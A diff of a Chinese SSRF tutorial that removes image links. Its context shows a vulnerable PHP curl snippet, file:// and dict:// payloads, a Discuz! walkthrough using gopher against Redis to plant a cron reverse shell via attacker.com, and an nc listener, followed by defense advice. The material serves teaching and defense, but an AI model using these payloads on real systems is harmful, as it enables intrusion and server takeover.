@@ -8,7 +8,6 @@
 
 ---
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_5.png)
 
 ## 一、SSRF漏洞的常见出现位置 🔍
 
@@ -28,7 +27,6 @@
 
 在了解了漏洞可能出现的位置后，我们需要一个强大的工具来理解和利用它。本节将介绍cURL命令的基本使用及其支持的多种协议，这是利用SSRF的基础。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_7.png)
 
 cURL不仅支持HTTP/HTTPS，还支持多种其他协议，这为SSRF利用提供了广阔空间。
 
@@ -64,9 +62,7 @@ cURL不仅支持HTTP/HTTPS，还支持多种其他协议，这为SSRF利用提�
     ```
     Gopher协议功能强大，可以封装复杂的TCP数据流，常用于攻击内网服务如Redis、MySQL等。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_13.png)
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_15.png)
 
 **PHP环境下的cURL调用**：
 在Web应用中，SSRF常通过PHP的`curl_exec()`函数实现。一个存在漏洞的简单代码如下：
@@ -82,19 +78,15 @@ curl_close($ch);
 ```
 如果未对`$url`进行过滤，攻击者可以传入`file:///etc/passwd`或`dict://127.0.0.1:6379/info`等协议进行利用。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_17.png)
 
 ---
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_19.png)
 
 ## 三、实战：Discuz! SSRF + Redis未授权Getshell 🚀
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_21.png)
 
 掌握了工具原理后，我们进入实战环节。本节将以一个存在SSRF漏洞的Discuz!论坛为例，演示如何通过端口扫描发现内网Redis服务，并利用Gopher协议反弹Shell。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_23.png)
 
 ### 1. 漏洞环境与限制绕过
 
@@ -121,7 +113,6 @@ curl_close($ch);
     ```
     这样，请求`http://attacker.com/shell.jpg`实际上会执行其中的PHP代码。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_25.png)
 
 ![](img/2a680dcfa2598ebcdfd417f5d0286ec6_27.png)
 
@@ -133,7 +124,6 @@ curl_close($ch);
 
 以下是扫描脚本的核心逻辑（Python示例）：
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_31.png)
 
 ```python
 import requests
@@ -156,19 +146,14 @@ for port in [21, 22, 80, 6379, 3306]:
 ```
 通过扫描，我们发现了目标服务器本地开放了**6379端口**（Redis默认端口）。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_33.png)
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_35.png)
 
 ### 3. 利用Gopher协议攻击Redis
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_37.png)
 
 确认存在Redis服务后，目标是利用其未授权访问漏洞写入计划任务，反弹Shell。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_39.png)
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_41.png)
 
 *   **步骤一：生成攻击Payload**
     首先，在本地使用`redis-cli`手动构造一个能反弹Shell的命令序列，并用`nc`监听流量，将完整的TCP交互数据保存下来。
@@ -202,7 +187,6 @@ for port in [21, 22, 80, 6379, 3306]:
     访问：`http://target.com/ssrf.php?data=http://attacker.com/ftp.php`
     服务器会向本地的Redis发送精心构造的数据，成功写入计划任务。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_45.png)
 
 *   **步骤四：接收反弹Shell**
     在攻击者服务器上监听指定端口：
@@ -215,7 +199,6 @@ for port in [21, 22, 80, 6379, 3306]:
 
 ![](img/2a680dcfa2598ebcdfd417f5d0286ec6_47.png)
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_49.png)
 
 ## 四、SSRF漏洞的防御与绕过技巧 🛡️
 
@@ -223,7 +206,6 @@ for port in [21, 22, 80, 6379, 3306]:
 
 ![](img/2a680dcfa2598ebcdfd417f5d0286ec6_51.png)
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_53.png)
 
 1.  **限制请求协议（仅允许HTTP/HTTPS）**：
     *   **绕过**：如前所述，利用`header()`跳转、302重定向或利用其他服务（如DNS Rebinding）进行绕过。
@@ -237,7 +219,6 @@ for port in [21, 22, 80, 6379, 3306]:
 4.  **校验URL后缀或内容类型**：
     *   **绕过**：利用Apache/Nginx的配置特性，使服务器将图片或文本文件当作PHP脚本解析，如本节实战所用方法。
 
-![](img/2a680dcfa2598ebcdfd417f5d0286ec6_55.png)
 
 **最重要的防御建议**：
 *   **白名单校验**：严格校验用户输入的URL，只允许访问预期的、安全的域名和资源。
